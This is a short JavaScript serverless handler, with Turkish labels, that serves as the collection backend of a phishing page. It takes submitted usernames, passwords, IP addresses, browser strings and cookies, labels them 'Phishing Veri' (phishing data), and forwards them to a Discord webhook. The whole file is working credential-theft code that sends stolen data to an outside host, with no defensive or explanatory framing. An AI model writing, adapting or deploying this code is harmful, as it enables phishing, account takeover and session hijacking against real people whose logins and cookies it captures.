exports.handler = async (event) => {
    const { username, password, ip, user_agent, cookies } = JSON.parse(event.body) || {};
    const message = `Phishing Veri - ${new Date().toISOString()}:\n**Kullanıcı**: ${username}\n**Şifre**: ${password}\n**IP**: ${ip}\n**Tarayıcı**: ${user_agent}\n**Çerezler**: ${cookies}`;
    const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
    });
    if (!response.ok) throw new Error('Discord yanıtı başarısız');
    return { statusCode: 200 };
};
